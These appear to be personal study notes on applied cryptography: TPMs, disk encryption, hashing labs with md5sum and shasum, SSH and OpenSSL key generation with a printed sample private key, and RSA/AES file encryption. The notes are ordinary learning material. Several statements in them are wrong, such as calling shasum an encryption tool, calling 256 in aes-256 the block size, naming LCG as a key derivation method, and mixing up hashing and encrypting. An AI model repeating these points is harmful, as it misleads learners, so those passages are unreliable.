manufacturer would have access to this key at the time. It is possible
for the manufacturer to store the keys that could then be used to
duplicate a TPM, that could break the security the module is supposed to
provide. There\'s been one report of a physical attack on a TPM which
allowed a security researcher to view and access the entire contents of
a TPM. But this attack required the use of an electron microscope and
micron precision equipment for manipulating a TPM circuitry. While the
process was incredibly time intensive and required highly specialized
equipment, it proved that such an attack is possible despite the tamper
protections in place. You can read more about it just after this video.
TPMs are most commonly used to ensure platform integrity, preventing
unauthorized changes to the system either in software or hardware, and
full disk encryption utilizing the TPM to protect the entire contents of
the disk.

**Full Disk Encryption**

Full Disk Encryption or FDE, as you might have guessed from the name, is
the practice of encrypting the entire drive in the system. Not just
sensitive files in the system. This allows us to protect the entire
contents of the disk from data theft or tampering. Now, there are a
bunch of options for implementing FDE. Like the commercial product PGP,
Bitlocker from Microsoft, which integrates very well with TPMs,
Filevault 2 from Apple, and the open source software dm-crypt, which
provides encryption for Linux systems. An FDE configuration will have
one partition or logical partition that holds the data to be encrypted.
Typically, the root volume, where the OS is installed. But, in order for
the volume to be booted, it must first be unlocked at boot time. Because
the volume is encrypted, the BIOS can\'t access data on this volume for
boot purposes. This is why FDE configurations will have a small
unencrypted boot partition that contains elements like the kernel,
bootloader and a netRD. At boot time, these elements are loaded which
then prompts the user to enter a passphrase to unlock the disk and
continue the boot process. FDE can also incorporate the TPM, utilizing
the TPM encryption keys to protect the disk. And, it has platform
integrity to prevent unlocking of the disk if the system configuration
is changed. This protects against attacks like hardware tampering, and
disk theft or cloning. Before we wrap up this module on encryption, I
wanted to touch base on the concept of random. Earlier, when we covered
the various encryption systems, one commonality kept coming up that
these systems rely on. Did you notice what it was? That\'s okay if you
didn\'t. It\'s the selection of random numbers. This is a very important
concept in encryption because if your number selection process isn\'t
truly random, then there can be some kind of pattern that an adversary
can discover through close observation and analysis of encrypted
messages over time. Something that isn\'t truly random is referred to as
pseudo-random. It\'s for this reason that operating systems maintain
what\'s referred to as an entropy pool. This is essentially a source of
random data to help seed random number generators. There\'s also
dedicated random number generators and pseudo-random number generators,
that can be incorporated into a security appliance or server to ensure
that truly random numbers are chosen when generating cryptographic keys.
I hope you found these topics in cryptography interesting and
informative. I know I did when I first learned about them. In the next
module, we\'ll cover the three As of security, authentication,
authorization and accounting. These three As are awesome and I\'ll tell
you why in the next module. But before we get there, one final quiz on
the cryptographic concept we\'ve covered so far.

### Encrypted Web Traffic

![A picture containing text, screenshot, funny Description automatically
generated](media/image21.png){width="6.5in"
height="2.4965277777777777in"}

# Cryptology in Practice

## Encoding

**Encoding** - This is NOT a form of encryption, just a form of data
representation like base64 or hexadecimal. Immediately reversible.

### base64

**encode**

base64 \<file\>

*piping*

echo -n \'encodeme\' \| base64

**decode**

base64 -d \<file\>

## Hashing (Creating a hash digest of a string/file)

### Introduction

In this lab, you\'ll have hands-on practice demonstrating hashing and
hash verification using md5sum and shasum tools.

*Md5sum* is a hashing program that calculates and verifies 128-bit MD5
hashes. As with all hashing algorithms, theoretically, there\'s an
unlimited number of files that will have any given MD5 hash. Md5sum is
used to verify the integrity of files.

Similarly, *shasum* is an encryption program that calculates and
verifies SHA hashes. It\'s also commonly used to verify the integrity of
files.

In this lab, you\'ll see that almost any change to a file will cause its
MD5 hash or SHA hashes to change.

**What you\'ll do**

-   **Compute**:You\'ll create a text file and generate hashes using the
    md5sum and shasum tools.

-   **Inspect**:After you generate the hash digests, you\'ll inspect the
    resulting files.

-   **Verify**:You\'ll verify the hash using the md5sum and shasum
    tools.

-   **Modify**:You\'ll modify the text file and compare these results to
    the original hash to observe how the digest changes and how the hash
    verification process fails.

### MD5 (128 bit hash)

**MD5 without any newline characters (from stdin)**

![](media/image22.png){width="4.729827209098863in"
height="0.4896511373578303in"}

Note how md5sum reads in binary by default (no difference when adding -b
switch):

![Text Description automatically generated with low
confidence](media/image23.png){width="5.396586832895888in"
height="0.8438681102362204in"}

Let\'s kick things off by creating a text file containing some data.
Feel free to substitute your own text data, if you want. This command
creates a text file called \"file.txt\" with a single line of basic text
in it:

You should see the following output (or something very similar) :

echo \'This is some text in a file, just so we have some data\' \>
file.txt

You\'ll now generate the MD5 sum for the file and store it. To generate
the sum for your new file, enter this md5sum command:

md5sum file.txt \> file.txt.md5

This creates the MD5 hash, and saves it to a new file. You can take a
look at the hash by printing its contents to the screen, using this
command:

cat file.txt.md5

This should print the hash to the terminal, which should look something
like this:

c7a8ef893898f9a6b380eb4ec1e87113 file.txt

More importantly, you can also verify that the hash is correct, and that
the original file (file.txt) hasn\'t been tampered with since the sum
was made. To do this, enter this command and see the following output,
which indicates that the hash is valid:

md5sum -c file.txt.md5

Since the original filename is included in the md5 file, we know which
file to reference.

Note -- the file path to the original file is relative -- this can be
changed (manully) to an absolute path this way you can move your.md5
file anywhere anad still reference the same flie to see if it's been
changed.

file.txt: OK

md5sum

### Verifying an invalid file

Next, we\'ll demonstrate the security of this process by showing how
even a single-character change to the file results in a different hash.
First, you\'ll create a copy of the text file, and insert a single space
at the end of the file. Feel free to use any text-editor that you\'d
like. Head\'s up that we\'ve included instructions for making this
change in Nano. To make a copy of the file, enter this command:

cp file.txt badfile.txt

Then generate a new md5sum for the new file:

md5sum badfile.txt \> badfile.txt.md5

Note that the resulting hash is **identical** to the hash for our
original file.txt despite the filenames being different. This is because
hashing only looks at the data, not the metadata of the file.

cat badfile.txt.md5

cat file.txt.md5

To open the text file in Nano, enter this command:

nano badfile.txt

This will open the file in the text editor. To add a space to the end of
the file, use the arrow keys (not the mouse!) to move the cursor to the
end of the line of text. Then, press the spacebar to add a space
character to the end of the file. Your screen should look like this
image:

This is some text in a file, just so we have some data

\^G Get Help \^O Write Out \^W Where Is \^K Cut Text \^J Justify \^C Cur
Pos

\^X Exit \^R Read File \^\\ Replace \^U Uncut Text \^T To Spell \^\_ Go
To Line

To save the file, press **ctrl+X**. You should see this message:

This is some text in a file, just so we have some data

Save modified buffer? (Answering \"No\" will DISCARD changes.)

Y Yes

N No \^C Cancel

Confirm by typing **Y** for **yes**, then press **Enter** to confirm.

This will take you back to the normal terminal screen. Now that you\'ve
made a very minor change to the file, try verifying the hash again. It
should fail verification this time, showing that any change at all will
result in a different hash. Try to verify it by entering this command
again:

md5sum -c badfile.txt.md5

You should see a message that shows that the verification wasn\'t
successful:

badfile.txt: FAILED

md5sum: WARNING: 1 computed checksum did NOT match

Click *Check my progress* to verify the objective.

md5sum failure

To see how different the hash of the edited file is, generate a new hash
and inspect it:

md5sum badfile.txt \> new.badfile.txt.md5

cat new.badfile.txt.md5

Check out how it\'s different from our previously generated hash:

dcd879fd2c162dbfe9a186a67902e7ce badfile.txt

For reference, here are the contents of the original sum:

c7a8ef893898f9a6b380eb4ec1e87113 file.txt

Click *Check my progress* to verify the objective.

Recompute MD5 Sum

### SHA

Let\'s do the same steps, but for SHA1 and SHA256 hashes using the
shasum tool. Functionally, the two work in very similar ways, and their
purpose is the same. But SHA1 and SHA256 offer stronger security than
MD5, and SHA256 is more secure than SHA1. This means that it\'s easier
for a malicious third party to attack a system using MD5 than one using
SHA1. And because SHA256 is the strongest of the three, it\'s currently
widely used.

### SHA1

To create the SHA1 sum and save it to a file, use this command:

shasum file.txt \> file.txt.sha1

View it by printing it to the screen, like you\'ve done before:

cat file.txt.sha1

65639a89992784291d769e05338085d1739645c6 file.txt

Now, verify the hash using the command below. (Like before, this would
fail if the original file had been changed.)

shasum -c file.txt.sha1

You should see the following output, indicating that the verification
was a success:

file.txt: OK

Click *Check my progress* to verify the objective.

SHA1 Hash

### SHA256

**SHA without any newline characters (from stdin)**

![](media/image24.png){width="6.5in" height="0.4701388888888889in"}

The same tool can be used to create a SHA256 sum. The \"-a\" flag
specifies the algorithm to use, and defaults to SHA1 if nothing is
specified. To generate the SHA256 sum of the file, use this command:

shasum -a 256 file.txt \> file.txt.sha256

You can output the contents of this file, the same as before:

cat file.txt.sha256

SHA256\'s increased security comes from it creating a longer hash
that\'s harder to guess. You can see that the contents of the file here
are much longer than the SHA1 file:

7a54af37c15a82e157c8368324e7234d22778ce845219cd16172895a608030ff
file.txt

Finally, to verify the SHA256 sum, you can use the same command as
before:

shasum -c file.txt.sha256

Click *Check my progress* to verify the objective.

SHA256 Hash

### \[Windows 10\] Hashing a files, dirs, and values

#### In GUI

*Using cmd prompt*

1.  **Encrypt the file**

    a.  Right-click \> Properties \> Advanced \> "Encrypt Contents to
        secure data"

#### Using Command prompt

**Hash the file** (creates a checksumf for a file)

certutil \<flag\> \<file path\> \<algorithm\>

**certutil --hashfile C:\\Users\\Joe\\Documents\\secretfile.txt SHA512**

\^ That will return the hash value -- save that for later comparison

#### Using Powershell

<https://adamtheautomator.com/get-filehash/>

![Text Description automatically
generated](media/image25.png){width="6.5in"
height="3.504861111111111in"}

![Text Description automatically
generated](media/image26.png){width="6.5in"
height="4.924305555555556in"}

![Text Description automatically
generated](media/image27.png){width="6.5in"
height="3.2256944444444446in"}

![Text Description automatically
generated](media/image28.png){width="6.5in"
height="5.3902777777777775in"}

![Text Description automatically
generated](media/image29.png){width="6.5in"
height="4.7243055555555555in"}

![Text Description automatically
generated](media/image30.png){width="6.5in"
height="4.270138888888889in"}

![A screenshot of a computer Description automatically generated with
medium confidence](media/image31.png){width="6.5in" height="3.25in"}

![Text Description automatically
generated](media/image32.png){width="6.5in"
height="5.260416666666667in"}

## Encryption: Creating/inspecting keys, encrypting/decrypting and signing

### RSA Encryption \[Asymmetric\]

#### Key Management

##### Checking for existing keys

sudo find \~ -maxdepth 3 -type f \| xargs file \| egrep -Hi
\'(private\|public)\\s?key\' \| sort -k1 \| awk -F: \'{ print \$2,\$3
}\'

\^ this command finds all files (three levels within your home folder)
that are keys based off the file type.

![A picture containing text Description automatically
generated](media/image33.png){width="6.5in"
height="1.4354166666666666in"}

**[Other methods below (not as thorough/cool)]{.underline}**

An SSH key is a cryptographically secure identifier. It's like a really
long password used to identify your machine. GitHub uses SSH keys to
allow you to upload to your repository without having to type in your
username and password every time.

First, we need to see if you have an SSH key already installed. Type
this into the terminal:

ls \~/.ssh/id_rsa.pub

This works as well (searches for any public key)

\$ ls \~/.ssh/\*.pub

If a message appears in the console containing the text "No such file or
directory", then you do not yet have an SSH key, and you will need to
create one. If no message has appeared in the console output, you
already have a key and can proceed to step 2.4.

(Alternative)Checking for existing SSH keys (GitHub guide)

<https://docs.github.com/en/github/authenticating-to-github/checking-for-existing-ssh-keys>

Before you generate an SSH key, you can check to see if you have any
existing SSH keys.

Note: DSA keys (SSH-DSS) are no longer supported. Existing keys will
continue to function, but you cannot add new DSA keys to your GitHub
account.

![Graphical user interface, text, application, email Description
automatically generated](media/image34.png){width="6.5in"
height="3.1618055555555555in"}

If you don\'t have an existing public and private key pair, or don\'t
wish to use any that are available to connect to GitHub, then [generate
a new SSH
key](https://docs.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent).

If you see an existing public and private key pair listed (for
example **id_rsa.pub** and **id_rsa**) that you would like to use to
connect to GitHub, you can [add your SSH key to the
ssh-agent](https://docs.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent/#adding-your-ssh-key-to-the-ssh-agent).

##### Generating a new key

**Helpful Links for study**

<https://www.youtube.com/watch?v=mNtQ55quG9M>

<https://youtu.be/WgZIv5HI44o>

<https://www.computerhope.com/unix/wget.htm>

<https://mohitgoyal.co/2021/01/12/basics-of-ssh-generate-ssh-key-pairs-and-establish-ssh-connections-part-1/>

<https://mohitgoyal.co/2021/01/13/basics-of-ssh-generate-ssh-key-pairs-and-establish-ssh-connections-part-2/>

<https://kb.heficed.com/en/articles/2713461-how-to-generate-and-use-ssh-private-public-keys>

**TroubleShooting**

<https://phoenixnap.com/kb/ssh-permission-denied-publickey>

<https://linuxhint.com/ssh-permission-denied-publickey-error/>

<https://bitlaunch.io/blog/how-to-fix-the-ssh-permission-denied-publickey-error/>

<https://www.systutorials.com/how-to-choose-the-key-used-by-ssh-for-a-specific-host/>

<https://blog.softhints.com/add-ssh-key-and-permission-denied-publickey/>

<https://linuxhandbook.com/fix-permission-denied-publickey/>

Complete Windows outline:
<https://syntaxbytetutorials.com/add-a-github-ssh-key-on-windows/>

###### Ssh-keygen vs Openssl

-   **Library**

    -   Ssh-keygen used openssh

    -   Openssl uses openssl

-   **File(s)**

    -   Ssh-keygen : Key generation results in two keys (a public and a
        private) usually of the form **id_rsa** and **id_rsa.pub**.

    -   Openssl : Key generation results in the creation of one key
        (usually PEM) which is a private key. Public key from private
        key can be generated from private key.

###### Using OpenSSH (ssh-keygen)

####### The basic command (not preferred)

ssh-keygen

-   On Unix-based (Linux/Mac) -- run command directly in terminal

-   On windows (with no SSH support) use putty or bash

![Text Description automatically
generated](media/image35.png){width="6.5in"
height="0.8638888888888889in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image36.png){width="6.5in"
height="2.1145833333333335in"}

If you get perms error -- make sure .ssh dir has proper perms for user
creating the key.

####### Command with associated email (preferred)

To create a new SSH key, run the following command inside your terminal.
The -C flag followed by your email address ensures that GitHub knows who
you are.(Technically you don't need the --C flag or the email as it
would still work without it).

Note: The angle brackets (\< \>) in the code snippet below indicate that
you should replace that part of the command with the appropriate
information. Do not include the brackets themselves in your command. For
example, if your email address is odin@theodinproject.com, then you
would type ssh-keygen -C odin@theodinproject.com. You will see this
convention of using angle brackets to indicate placeholder text used
throughout The Odin Project's curriculum and other coding websites, so
it's good to be familiar with what it means.

ssh-keygen -C \<youremail\>

**Alternative (specifying algorithm and associated emal -- PREFERRED FOR
GITHUB)**

\$ ssh-keygen -t rsa -b 4096 -C <example@example.com>

> The algorithm is selected using the -t option and key size using
> the -b option. The following commands illustrate:
>
> ssh-keygen -t rsa -b 4096
>
> ssh-keygen -t dsa
>
> ssh-keygen -t ecdsa -b 521
>
> ssh-keygen -t ed25519

-   When it prompts you for a location to save the generated key, just
    push Enter.

-   Next, it will ask you for a password; enter one if you wish, but
    it's not required.

After this you will see a new hidden folder ( titled '.SSH') in the
current directory which will now contain two files: (i) an rsa key and a
(ii) public key.

![Graphical user interface, application Description automatically
generated](media/image37.png){width="6.5in" height="5.10625in"}

####### Change/remove password of a private ssh key (openssh)

![](media/image38.png){width="4.423838582677165in"
height="0.17361986001749782in"}

ssh-keygen -p -f \<private-key-path\>

This will then prompt you to enter the keyfile location, the old
passphrase, and the new passphrase (which can be left blank to have no
passphrase).

\^ **Must run as root** (at least from my testing)

###### Using openssl (openssl)

Using openssl only generates a private key however you can generate a
public key from a public key.

####### OpenSSL RSA Cheat Sheet

To remove the pass phrase on an RSA private key:

-   openssl rsa -in key.pem -out keyout.pem

To encrypt a private key using triple DES:

-   openssl rsa -in key.pem -des3 -out keyout.pem

To convert a private key from PEM to DER format:

-   openssl rsa -in key.pem -outform DER -out keyout.der

To print out the components of a private key to standard output:

-   openssl rsa -in key.pem -text -noout

To just output the public part of a private key:

-   openssl rsa -in key.pem -pubout -out pubkey.pem

Output the public part of a private key in RSAPublicKey format:

-   openssl rsa -in key.pem -RSAPublicKey_out -out pubkey.pem

####### Generate a private RSA key 

**Generate a 2048 bit RSA Private Key**

Note: The NSA Recommends 3072 bit key or higher.

The key size or bit length of public keys determines the strength of
protection. For example, 2048-bit RSA keys are often employed in SSL
certificates, digital signatures, and other digital certificates. This
key length offers sufficient cryptographic security to keep hackers from
cracking the algorithm.

-   openssl genrsa -out private-key.pem 2048

-   ![Graphical user interface, application Description automatically
    generated](media/image39.png){width="3.971971784776903in"
    height="1.3544717847769028in"}

In this example, we have used a key length of 2048 bits.

This gives us a PEM file containing our RSA private key, which should
look something like the following:

-----BEGIN RSA PRIVATE KEY-----\
-----END RSA PRIVATE KEY-----

####### Generate a password-protected private RSA key 

All you need to do is specify the algorithm that should be used to
encrypt the private key

openssl genrsa \<algo\> -out \<privatekeyname\> \<bit-size\>

*Supported algorithms*

**-aes128\|-aes192\|-aes256\|-camellia128\|-camellia192\|-camellia256\|-des\|-des3\|-idea**

-   openssl genrsa -des3 -out private.pem 2048

That generates a 2048-bit RSA key , encrypts them with a password we
provide and writes them to a file.

 

Another RSA key created with a 4096-bit key

![](media/image40.png){width="6.5in" height="0.37083333333333335in"}

Why not use AES for everything?

openssl genrsa -aes256 -out private.pem 2048

####### View existing/created keys

openssl rsa -text in mykey.key

####### overview and verbose

In this lab, you\'ll learn how to generate RSA private and public key
pairs using the OpenSSL utility.

OpenSSL is a commercial-grade utility toolkit for Transport Layer
Security (TLS) and Secure Sockets Layer (SSL) protocols. It\'s also a
general-purpose cryptography library. OpenSSL is licensed under an
Apache-style license, which means that you\'re free to get it and use it
for commercial and non-commercial purposes (subject to some simple
license conditions).

**What you\'ll do**

-   **OpenSSL:** You\'ll explore what generating key pairs looks like
    using OpenSSL.

-   **Encrypt and decrypt:** You\'ll use the key pair to encrypt and
    decrypt some small amount of data.

-   **Verify:** You\'ll use the key pair to sign and verify data to
    ensure its accuracy.

Before you can encrypt or decrypt anything, you need a private and a
public key, so let\'s generate those first!

**Generating a private key**

Remember, a key pair consists of a public key that you can make publicly
available, and a private key that you need to keep secret. Shhhh. :)
When someone wants to send you data and make sure that no one else can
view it, they can encrypt it with your public key. Data that\'s
encrypted with your public key can only be decrypted with your private
key, to ensure that only you can view the original data. This is why
it\'s important to keep private keys a secret! If someone else had a
copy of your private key, they\'d be able to decrypt data that\'s meant
for you. Not good!

First, let\'s generate a 2048-bit RSA private key, and take a look at
it. To generate the key, enter this command into the terminal:

openssl genrsa -out private-key.pem 2048

Copied!

content_copy

You should see the following output (or something very similar) :

Generating RSA private key, 2048 bit long modulus (2 primes)

\...\...\...\...\....+++++

\...\...\...\...\...\...\...\...\...\...\...\...\...\...+++++

e is 65537 (0x010001)

This command creates a 2048-bit RSA key, called \"private_key.pem\". The
name of the key is specified after the \"-out\" flag, and typically ends
in \".pem\". The number of bits is specified with the last argument. To
view your new private key, use \"cat\" to print it to the screen, just
like any other file:

cat private_key.pem

Copied!

content_copy

The contents of the private key file should look like a large jumble of
random characters. This is actually correct, so don\'t worry about being
able to read it:

\-\-\-\--BEGIN RSA PRIVATE KEY\-\-\-\--

MIIEowIBAAKCAQEA4kNMSmssCSYbOnq/UAHGH5xx9gjZaOiST3JQQtJO11L/YeBO

8DOHc7UawNADA/XDBAnGZih1M8T1PGc6Vk5SW2Lb8FMf9zG2XhYpCACFFPJAW00q

s4s1JesdugOprHZ8Jmm/QJl4KuCjlY/XdviCvcbxROIQ2mglR8nW1QWrhECQNBfo

dRSuTwmW3qBSW/Xd5pmTpP4GHCyUfRO9YCF/tZYtVMYg4FOqdGaTHRZbs6peMV4D

lSjZHDonnsGK0UJpxQNbtJEcG7vr7Vl8ziVWY5RUDND7nZYlQlbqxvvqbPPt+px3

4pAZ58eyOqeAmYBc8mwNoXp4YrC2deFng7zrKwIDAQABAoIBAB6SR0Ga33VQ/8bU

BPtzceidg8xhf7asDfDMGkodDmgLn9QCscfEvp2Er9uzf2TOlQ37oCH3f3aCOzxx

GjHFHV2Zquv630vQHLrztZGOOG0PGmD7uTRPL9wyu26BxjA2RioOibfZxKHOfmvb

5pn9k/S+Z6UOAobwIXFktTFNNdKFgalax813FlxFfmmoOC8kE30W6mP6iecP+ojm

xf577RhwR+PdE5zNNvm2F8j5ZWP39pboX7e3eYUCsEyPmVu1MSMTXrHHg6KNhCty

Qu1JfrAaisch+6vrAzfuP7t0WiILzieQgZzFDpI9HziwwOtCw+EKQhHCOPurWcO6

ByZUBzkCgYEA9aEprwqutbXB5H3QinxqXLInAH+wy8oTAMS6nV1sisIos6dD3CLO

u2fLRegv8PEUopASnzyv5PWU/iS+VJjdBCco59hmwW+7CVpaOJXlJ1qpznPVJmyx

pWsinM9Ug23GDd/jd61yKux22773RSGCYs9N7FVww5WYcDlWHLUFPk0CgYEA69DQ

h2iFuDSPonG8GPS6hf/KVRQaJZqGAINCk/2txTWmaz9VPdWT25+rxBzIoQOYAC4P

NjPHo/gJLrO/y6X6lAKBCje/Otb9E7GZwH0pFc7MxtQVR4ik6/7To3ancXNmawHe

owWZHDBRK+Ot33nZ+tYvAq48zE7rxNxsctZ9O1cCgYASsd12UR3S/q5vMZQ5thZy

T6zgQNe36v1fRZneeEnWlch7Q/PKQWvyn4e9Hlrnv7GOXeDM9dV9W6OnZCyIS8om

ksRuQO4xMsvNfm73d5ElWaUq7W3/qq4qpOjRfoY0Kpq0W6H4bd8OnUi+mN5BCLff

xV9s6WPXvv8HK5X+QVjQ0QKBgBrMqGY7IrdEge5cLpxHc8s2vq/ckPwlC4WTZUWc

VttKtZcKo41bcGpNQyAOhV6HIgcjNOdcCxw/XAvKsclbG5cmkbOvkjQFqs1KKccO

clTgI7WU9LYkeVm4pCS3n1/tVX5jwAGW6Uei1ha+0UvMdVFkdgM/+fjeHz1IL6r9

ZU4RAoGBALi33UjlJUYVMXPZc/JyFk8yyvRpYMRhmW7mQxR8gx0i1rNolPSccRkj

3NO+e1k86yyk3RsqBdixGKYDp2JqS+Aj7eHlxvUcrCAnpk9l96q8yuhQ4mJUWqs7

/hW6bxUPjDZ9BxprGZRL4ZLgPL+6C4Q4rE8TZu/5qQYDIy+ab03t

\-\-\-\--END RSA PRIVATE KEY\-\-\-\--

**Head\'s up:** Your private key will look similar to this, but it
won\'t be the same. This is super important, because if openssl was
generating the same keys over and over, we\'d be in serious trouble!

Click *Check my progress* to verify the objective.

Generate private key

Check my progress

**Generating a public key**

Now, let\'s generate the public key from the private key, and inspect
that one, too. Now that you have a private key, you need to generate a
public key that goes along with it. You can give that to anyone who
wants to send you encrypted data. When data is hashed using your public
key, nobody will be able to decrypt it unless they have your private
key. To create a public key based on a private key, enter the command
below. You should see the following output:

openssl rsa -in private_key.pem -outform PEM -pubout -out public_key.pem

Copied!

content_copy

writing RSA key

You can view the public key in the same way that you viewed the private
key. It should look like a bunch of random characters, like the private
key, but different and slightly shorter:

cat public_key.pem

Copied!

content_copy

\-\-\-\--BEGIN PUBLIC KEY\-\-\-\--

MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4kNMSmssCSYbOnq/UAHG

H5xx9gjZaOiST3JQQtJO11L/YeBO8DOHc7UawNADA/XDBAnGZih1M8T1PGc6Vk5S

W2Lb8FMf9zG2XhYpCACFFPJAW00qs4s1JesdugOprHZ8Jmm/QJl4KuCjlY/XdviC

vcbxROIQ2mglR8nW1QWrhECQNBfodRSuTwmW3qBSW/Xd5pmTpP4GHCyUfRO9YCF/

tZYtVMYg4FOqdGaTHRZbs6peMV4DlSjZHDonnsGK0UJpxQNbtJEcG7vr7Vl8ziVW

Y5RUDND7nZYlQlbqxvvqbPPt+px34pAZ58eyOqeAmYBc8mwNoXp4YrC2deFng7zr

KwIDAQAB

\-\-\-\--END PUBLIC KEY\-\-\-\--

**Head\'s up:** Like your private key, your public key will look
different than the one in this image.

Now that both of your keys have been created, and you can start using
them to encrypt and decrypt data. Let\'s dive in!

Click *Check my progress* to verify the objective.

Generate public key

Check my progress

##### Create public key from Private key

###### \[Openssl\] Create public key from Private key

**Generate corresponding Public key**

-   openssl rsa -in private-key.pem -pubout -out public-key.pem

-   to explicitly specify the outform add '-outform PEM' like so ...

-   openssl rsa -in private_key.pem -outform PEM -pubout -out
    public_key.pem

This should give us another PEM file, containing the public key.

The PEM public key format uses the header and footer lines:

-----BEGIN PUBLIC KEY-----\
-----END PUBLIC KEY-----

 ![Graphical user interface, text, application Description automatically
generated](media/image41.png){width="4.729409448818898in"
height="1.4514632545931758in"}

###### \[Openssh\] Create public key from private key

In this example we're using a PEM key as our private key

![Website Description automatically generated with medium
confidence](media/image42.png){width="6.5in"
height="2.1569444444444446in"}

We can also do with a standard OpenSSH private key

![Text Description automatically generated with medium
confidence](media/image43.png){width="3.9377023184601927in"
height="0.6805905511811023in"}

![Graphical user interface, text, application Description automatically
generated](media/image44.png){width="4.80580271216098in"
height="6.03503280839895in"}

##### Converting Openssl private key (pem) to OpenSSH Public key \[PuttyGen\]

***Please note***: PEM files can be anything...in some cases, a PEM will
actually already be in the RSA format. In which case no conversion is
necessary. At most, you would just need to create your public key based
off this private RSA to have your full pair. Spent to much time trying
to convert what I though was a pem key to an RSA key (open ssh
compatible key) which was already an RSA key.

Use 'i' for import

![](media/image45.png){width="3.229332895888014in"
height="0.2083442694663167in"}

Example: ssh-keygen -i -m PEM -f myfile.pem

**RTFM!**

![Text Description automatically
generated](media/image46.png){width="6.5in"
height="0.33819444444444446in"}

![Graphical user interface, text Description automatically
generated](media/image47.png){width="6.5in" height="0.35625in"}

![Text Description automatically
generated](media/image48.png){width="4.778023840769904in"
height="4.708575021872266in"}

#### Encrypting files using openssl

You\'ll simulate someone encrypting a file using your public key and
sending it to you, which allows you (and only you!) to decrypt it using
your private key. Similarly, you can encrypt files using other people\'s
public keys, knowing that only they will be able to decrypt them.

You\'ll create a text file that contains some information you want to
protect by encrypting it. Then, you\'ll encrypt and inspect it. To
create the file, enter the command below. It will create a new text file
called \"secret.txt\" which just contains the text, \"This is a secret
message, for authorized parties only\". Feel free to change this message
to anything you\'d like.

echo \'This is a secret message, for authorized parties only\' \>
secret.txt

Then, to encrypt the file using your public key, enter this command:

openssl rsautl -encrypt -pubin -inkey public_key.pem -in secret.txt -out
secret.enc

This creates the file \"secret.enc\", which is an encrypted version of
\"secret.txt\".

**OAEP (Optimized Asymmetric Encryption Padding)**

Secure implementations of RSA (when handling file) must use OAEP. This
can be done by adding the **-oaep** flag.

We can revise our previous command as follows:

openssl rsautl -encrypt -pubin -inkey public_key.pem -in secret.txt -out
secret.enc -oaep

**Why use OAEP**: Since RSA doesn't natively provide any nonce, RSA will
produce the same cyphertext when encrypting identical text with the same
public key.

This can potentially be used by attackers to break the encryption.

Both the preprocessing and postprocessing steps in OAEP address this to
further secure the encrypted data.

Notice that if you try to view the contents of the encrypted (binary)
file, the output is garbled. This is totally normal for encrypted
messages because they\'re not meant to have their contents displayed
visually.

**Another example**

![Graphical user interface, text Description automatically
generated](media/image49.png){width="5.250732720909887in"
height="1.9481889763779527in"}

Here\'s an example of what displaying the encrypted file \"secret.enc\"
looks like in the nano editor using the following command below:

nano \~/secret.enc

Output:

\^? \< e \^@vmD \^B% r\*M o\^R \^O 8 X { \^\\(\^B \^}= 1i T 9\~
\^RT\^\\\^Px \^T\^l n \^G \^O \^i iN (W \[ \^\$

\^a\^d\~m , d Tq L \< J \^Q bdQ

=Q R\[\^kT \^G iq GG \^T { UZ\^dV8\^A \^\~O#koj\^N\^\^ K vT \^O3
\^Tn\^oP\^l\^Pa \^u3\^G\^N\^i0=c{ \^tR09 o@\^d\$

\^G Get Help \^O Write Out \^W Where Is \^K Cut Text \^J Justify \^C Cur
Pos

\^X Exit \^R Read File \^\\ Replace \^U Uncut Text \^T To Spell \^\_ Go
To Line

To exit from the nano editor, use the command **Ctrl-X**.

The encrypted file will now be ready to send to whoever holds the
matching private key. Since that\'s you, you can decrypt it and get the
original contents back.

#### Decrypting files using openssl

Remember that we must use the private key to decrypt the message, since
it was encrypted using the public key. Go ahead and decrypt the file,
using this command:

openssl rsautl -decrypt -inkey private_key.pem -in secret.enc

This will print the contents of the decrypted file to the screen, which
should match the contents of \"secret.txt\":

This is a secret message, for authorized parties only

You can also output the decrypted contents to a file with the "-out"
option

openssl rsautl -decrypt -inkey private_key.pem -in secret.enc -out
myfile.txt

OAEP Consideration

Be sure to add the "-oaep" flag if the private key was created with oaep

openssl rsautl -decrypt -inkey private_key.pem -in secret.enc -oaep

![Text Description automatically
generated](media/image50.png){width="5.459095581802274in"
height="1.906515748031496in"}

#### Sending/Receiving RSA encrypted files

So how do we send encrypted files if they are all garbled? **We Base64
encode it!**

openssl base64 -in cipher.bin -out cipher.txt

\^ replace "cipher.bin" with your encrypted msg.

Decrypting

![Table Description automatically
generated](media/image51.png){width="6.5in" height="4.975in"}

### AES Encryption \[Symmetric\]

**Encrypting by password**

openssl aes256 -in secret.txt -out secret.enc

**Decrypting**

*Note (reverse the in/out paths -- use 'd' for decrypt)*

openssl aes256 -d -in secret.enc -out secret.txt

Print to standard output (remove 'out')

![](media/image52.png){width="4.219338363954506in"
height="0.3021259842519685in"}

Adding password as an arg with 'k' (key) switch

![](media/image53.png){width="5.9070745844269466in"
height="0.41672462817147854in"}

![Text Description automatically
generated](media/image54.png){width="6.5in"
height="5.098611111111111in"}

#### Encryption schemes and block cypher modes

**Encryption Scheme:** This is the combination of the **block cipher**
(encryption algorithm) and the **block cypher mode** in use. This

*Consider this*

openssl enc aes-256-ctr -pbkfdf2 -e -a -in myfile.txt -out encrypted.txt

"aes-256-ctr": This is the **Encryption scheme**

-   aes: block cipher/ encryption algorithm

-   256: block size in bits

-   ctr: block cipher mode (secure)

    1.  Insecure block cypher modes like ECB should be avoided.

AES Options (per openssl man page)

![](media/image55.png){width="6.5in" height="1.6847222222222222in"}

*More on cypher modes*

<https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb>

<https://www.quora.com/Which-is-recommended-AES-CBC-mode-or-AES-CTR-mode-AES-CBC-and-crypto>

Since an Encryption scheme relies on the combination of the block cypher
and block cypher mode, if either have weak implementations the entire
encryption scheme will be considered weak.

"pbkfdf2": This is the key derivation method.

-   Pbfkdf2 is considered a secure key derivation method whereas others
    like LCG should be avoided.

Its for the reasons above why its best to be verbose about our commands
when encrypting/decrypting with openssl.

#### \[Windows 10\] Encryption in Windows

##### Using command line

Use **aescrypt** utility: <https://www.aescrypt.com/download/>

**Encrypt a file with a password**

aescrypt -e -p \<password\> \<file\>

aescrypt -e -p superpass myfile.txt

![Text Description automatically
generated](media/image56.png){width="6.5in"
height="1.7805555555555554in"}

![Graphical user interface, text, application Description automatically
